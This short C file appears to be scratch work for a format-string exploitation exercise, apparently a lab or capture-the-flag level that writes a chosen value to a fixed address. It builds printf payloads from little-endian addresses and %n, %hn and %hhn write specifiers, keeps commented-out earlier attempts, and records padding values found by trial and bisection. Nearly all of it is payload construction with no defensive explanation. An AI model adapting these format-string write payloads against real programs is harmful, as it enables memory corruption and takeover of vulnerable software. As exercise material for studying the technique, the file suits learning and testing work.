#include <stdio.h>

int main ()
{
    //Address of m 0x804988c => 0x0804988c
    //=> 0x8c 0x98 0x04 0x08
    // char *str = "%12$n";
    // char *str2 = "%251c %7$hhn %50c %8$hhn";

    // char *str3 = "%12$hhn";
    // char *str4 = "%13$hhn";
    //printf("\x10\x98\x04\x08\x44\x55\x02\x01%s", str);
    //printf("\x10\x98\x04\x08%200c%s", 'c', str3);

    char *str5 = "%250x%12$hn%21570x%13$hn";

    printf("\x12\x98\x04\x08\x10\x98\x04\x08%s", str5);
}

//m :
// 0x8049810
// \x10\x98\x04\x08

//Goal :
// 0x01025544
// \x44\x55\x02\x01

// \x10\x98\x04\x08\xac\x98\x04\x08%2044x%4$hn%31943x%5$hn

//Par Dicotomie
//21828

//21828 -> 0x01025646
//21820 -> 0x0102563e
//21720 -> 0x010255da